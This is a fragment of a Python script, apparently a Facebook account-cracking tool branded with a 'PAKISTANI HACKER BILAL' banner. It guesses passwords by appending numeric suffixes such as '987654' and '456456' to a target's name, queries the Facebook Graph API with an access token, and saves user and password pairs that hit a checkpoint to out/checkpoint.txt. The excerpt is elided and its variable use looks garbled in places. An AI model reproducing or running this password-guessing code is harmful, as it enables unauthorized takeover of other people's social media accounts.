...
logo = """
   BILAL 
   ▄︻̷̿┻̿═━一
   THE ANONYMOUS BILAL TRICKER 
   THE LEGEND BILAL
   THE GAME CHANGER BILAL
   PAKISTANI HACKER BILAL
   BILAL ▄︻̷̿┻̿═━一
\033[1;91m=======================================
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							cek.close()
							ok.append(BILAL+pass2)
						else:
							pass3 = b['BILAL'] + '987654'
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															cek = open("out/checkpoint.txt", "a")
															cek.write(BILAL+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['BILAL'] + '456456'
